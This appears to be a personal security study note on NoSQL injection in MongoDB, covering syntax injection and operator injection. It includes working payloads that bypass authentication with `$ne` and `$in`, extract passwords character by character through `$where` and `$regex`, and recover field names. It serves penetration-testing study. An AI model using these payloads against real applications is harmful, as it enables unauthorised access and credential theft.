### General Notes

This is another injection vulnerability where the attacker is able to interfere with the queries that are made to a NoSQL database.
- This is similar to the [[SQL Injections]] vulnerability, but they aren't limited to only SQL queries.
- They use a range of query languages that have fewer relational constraints, such as `JSON` or `XML`.

NoSQL injections have 2 types:
- **Syntax Injection**: This is when the payload breaks into the query syntax, similar to [[SQL Injections]]. 
- **Operator Injection**: This is when NoSQL query operators are used to manipulate queries.

##### NoSQL Databases

These store and retrieve data in a format that is suitable to handle data that is unstructured or semi-structured.
- Hence, there are fewer relational constraints present.

Some examples of NoSQL databases include:
- **Document stores** - These store data in flexible, semi-structured documents. They typically use formats such as `JSON`, `BSON`, and `XML`, and are queried in an [[Application Programming Interface (API)]] or query language. Examples include MongoDB and Couchbase.
- **Key-value stores** - These store data in a key-value format. Each data field is associated with a unique key string. Values are retrieved based on the unique key. Examples include Redis and Amazon DynamoDB.
- **Wide-column stores** - These organize related data into flexible column families rather than traditional rows. Examples include Apache Cassandra and Apache HBase.
- **Graph databases** - These use nodes to store data entities, and edges to store relationships between entities. Examples include Neo4j and Amazon Neptune.

---
### Syntax Injection

Syntax injections can be detected by submitting special strings and characters to try and trigger database errors or some detectable behavior.
- This is the case when the user input points are not properly sanitized or filtered.
- Since NoSQL databases use a lot of different languages, try using strings that are relevant to that language and database.

###### Identifying injection points

A relevant fuzz string for an injection in MongoDB is:
```
'"`{ ;$Foo} $Foo \xYZ
```
- If a different response is returned that is not expected, then this indicates a possible injection point.

The URL encoded version of it:
```
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

If it is to be injection in a `JSON` object, then it would become:
```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

> A better methodology would be to try each character on its own to see which one causes the issues. Try also escaping characters using `\`.

###### Identifying conditional behavior

Once the proper injection character/string is identified, it should be used to try and force conditional responses.
- Boolean conditions should be used to influence the application to behave differently.
- This can be used for data exfiltration.

To confirm this, use both a *true* and a *false* condition and observe if the website behaves differently.

- False condition
```
' && 0 && '
```

- True condition
```
' && 1 && '
```

- Always True condition that will return all the rows.
```
'||'1'=='1
```

- Adding a NULL character `%00` at the end after the payload can be used to escape any other conditions after.
```
'||'1'=='1'%00
```

###### Exploiting to exfiltrate data

This process is conducted by creating Boolean conditions, and evaluating the response of the application.
- This can allow us to extract data character by character, similar to [[SQL Injections#Conditional Responses using `TrackingId`|Conditional Responses]]

Assuming that the injection point allows us to execute JavaScript using the `$where` operator, and performs the following NoSQL query in the backend with the input username `admin`
```
{"$where":"this.username == 'admin'"}
```

An example payload to exfiltrate the password of that user character by character is:
```
admin' && this.password[0] == 'a' || 'a'=='b
```
- The OR `||` condition at the end splits the payload into the left portion and the right portion.
- The right portion always evaluates to false, so the left portion must all evaluate to true for the application to return a desired response.
- The left part is an AND `&&` condition, and it is true if both, the username is `admin`, and the first character of the password is `a`.
- If either of those is not true, the query is false. If we know the username is `admin`, then we can brute force the password characters by trying all indices and all characters.

Another payload to use to get the length of the password using the same technique:
```
administrator' && this.password.length < 30 || 'a'=='b
```

To test for the existence of a field, we can determine the response for one that exists, and then use that to check for a different response if the column doesn't exist.
```
admin' && this.foo!='
```
- This checks if the `foo` column exists.

Another payload to use the `match()` function that uses [[Regular Expressions]] to identify if there are numbers in the password.
```
admin' && this.password.match(/\d/) || 'a'=='b
```

---
### Operator Injection

Query operators are used to specify conditions, some of the MongoDB operators are:
- `$where` - Matches documents that satisfy a JavaScript expression.
- `$ne` - Matches all values that are not equal to a specified value.
- `$in` - Matches all of the values specified in an array.
- `$regex` - Selects documents where values match a specified [[Regular Expressions|Regular Expression]].

To discover an operator injection point, try submitting different operators into different user input points, and view the returned responses.
- The way to insert operators depends on the input method.

For `JSON`, the operators can be inserted as nested objects.
- So `{"username":"wiener"}` will become 
```
{"username":{"$ne$":"invalid"}}
```

For inputs in the URL, the inputs can be inserted using query parameters.
- So `username=wiener` will become
```
username[$ne]=invalid
```
- Or, using a `POST` request instead and changing the `Content-Type` [[HTTP#HTTP Headers|HTTP Header]] to `application/json`, and using the `JSON` message as above.

###### Injection

Each input should be tested using a range of operators using the methods described above.
- Consider a vulnerable application that accepts a username and password in the body of a `POST` request:
```
{"username":"wiener","password":"peter"}
```

 If the `$ne` operator is applied, this queries all users where the username is not equal to `invalid`.
```
{"username":{"$ne":"invalid"},"password":"peter"}
```

If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload:
```
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```
- This query returns all login credentials where both the username and password are not equal to `invalid`. As a result, you're logged into the application as the first user in the collection.

To target an account, you can construct a payload that includes a known username, or a list of usernames
```
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```
- This returns rows that contain a username from a list, and whose password is not empty.

###### Exploiting to exfiltrate data

Unlike the syntax injection where there could be operators to run JavaScript, here we are the ones that inject the operators.
- Then, use Boolean conditions to determine if what we inputted gets executed.

Consider a `POST` request that sends body parameters in a `JSON` body.
- We can add the operator `$where` as an extra parameter in the `JSON` and give it a value.
```
{"username":"wiener","password":"peter", "$where":"0"}
{"username":"wiener","password":"peter", "$where":"1"}
```
- If there are different responses, then the JavaScript could be executed in the backend.

If you have injected an operator that enables you to run JavaScript, you may be able to use the `keys()` method to extract the *name of data fields*.
```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```
- This inspects the first (`[0]`) data field in the user object and returns the first character of the field name.  To get other fields, change the `[]` index.
- This enables you to extract the field name character by character.
- Observe how the response differs based on true or false conditions, and then change the placeholder in the `match` function and the letter after it.

To exfiltrate actual data, we can use the `$regex` operator. It can be first tested by checking if it is accepted, and whether there is a difference in response.
```
{"username":"admin","password":{"$regex":"^.*"}}
```

We can then test for each character, and check if the response changes for true/false passwords:
```
{"username":"admin","password":{"$regex":"^a*"}}
```
- This checks if the password starts with `a`.
- We can then keep testing all characters, and then add more.

---
